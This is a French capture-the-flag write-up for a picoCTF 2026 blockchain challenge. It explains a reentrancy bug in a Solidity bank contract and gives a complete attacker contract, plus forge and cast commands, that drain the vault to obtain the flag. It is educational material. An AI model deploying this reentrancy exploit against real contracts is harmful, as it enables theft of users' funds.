# 753 — Reentrance

**Événement** : picoCTF 2026 · **Catégorie** : Blockchain

## Énoncé

> The lead developer at SecureBank Corp is back. He claims he's patched the vault and created the
> ultimate, unhackable Ethereum contract. Your mission: Drain the vault down to 0 and force the
> contract to surrender the flag.

Le contrat `VulnBank.sol` est fourni, avec une instance déployée (RPC et compte approvisionné).

## Analyse

### Lecture du contrat

```bash
grep -nE 'function|msg.sender|call\{|balance|flag' VulnBank.sol
```

`withdraw()` présente la forme classique du bug de réentrance : il envoie l'ETH à l'appelant **avant**
de décrémenter son solde.

```solidity
function withdraw(uint256 amount) external {
    require(balances[msg.sender] >= amount, "insufficient");
    (bool ok, ) = msg.sender.call{value: amount}("");
    require(ok, "transfer failed");
    balances[msg.sender] -= amount;   // trop tard
}
```

L'ordre checks-effects-interactions est inversé : l'effet sur `balances` intervient après
l'interaction externe, donc pendant que l'appelant reçoit les fonds, son solde est encore périmé.

### Conséquence

Un contrat attaquant peut rappeler `withdraw()` depuis son `receive()`, à un moment où son solde n'a
pas encore été décrémenté. Chaque appel imbriqué repasse le `require` avec le même solde d'origine.

`getFlag()` ne rend le flag que si le solde de la banque est nul : il faut donc réellement drainer, une
lecture directe avant l'attaque ne rendant rien ou revertant. Le flag valide l'état final du contrat.

## Solution

### 1. Déployer le contrat attaquant

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IVulnBank {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function getFlag() external view returns (string memory);
}
contract Attacker {
    IVulnBank public target;
    uint256 public amount;
    constructor(address t) { target = IVulnBank(t); }
    function attack() external payable {
        amount = msg.value;
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }
    receive() external payable {
        if (address(target).balance >= amount) {
            target.withdraw(amount);
        }
    }
    function getFlag() external view returns (string memory) {
        return target.getFlag();
    }
}
```

Le `receive()` est indispensable : sans lui, le remboursement échoue et l'attaque revert dès le
premier appel.

### 2. Lancer l'attaque

```bash
forge create src/Attacker.sol:Attacker \
  --rpc-url $RPC --private-key $PK \
  --constructor-args $BANK --broadcast

cast send <ATTACKER> 'attack()' --value 1ether \
  --rpc-url $RPC --private-key $PK --gas-limit 3000000
```

`--broadcast` est obligatoire : sans lui, `forge create` simule et n'envoie rien on-chain. Le
`--gas-limit` explicite évite qu'une estimation trop basse coupe la récursion trop tôt.

### 3. Vérifier puis lire le flag

```bash
cast balance $BANK --rpc-url $RPC        # doit afficher 0
cast call <ATTACKER> 'getFlag()(string)' --rpc-url $RPC
```

Le wrapper `getFlag()` sur le contrat attaquant est une commodité : `getFlag()` est `view`, donc
`cast call $BANK 'getFlag()(string)'` fonctionne aussi une fois le drain effectué.

### Pourquoi ça marche

La banque vérifie, transfère, puis met à jour : entre le transfert et la mise à jour, le contrôle passe
au code de l'attaquant, qui rappelle la fonction avec un état encore valide. La récursion s'arrête
d'elle-même quand la banque n'a plus assez d'ETH, ce qui est exactement l'état attendu par `getFlag()`.

## Pièges

- **Oublier `--broadcast`.** Le script réussit, rien n'est envoyé : on attaque ensuite une adresse vide.
- **Ne pas déposer avant d'attaquer.** Sans dépôt, le `require` du premier `withdraw` revert.
- **Gas trop juste.** Chaque appel imbriqué consomme du gas ; une limite trop basse peut laisser un
  solde résiduel.
- **Lire le flag avant le drain.** `getFlag()` exige un solde nul : l'appeler trop tôt ne rend rien.
- **Confondre le solde du compte et celui du contrat.** C'est `address(bank).balance` qui compte.
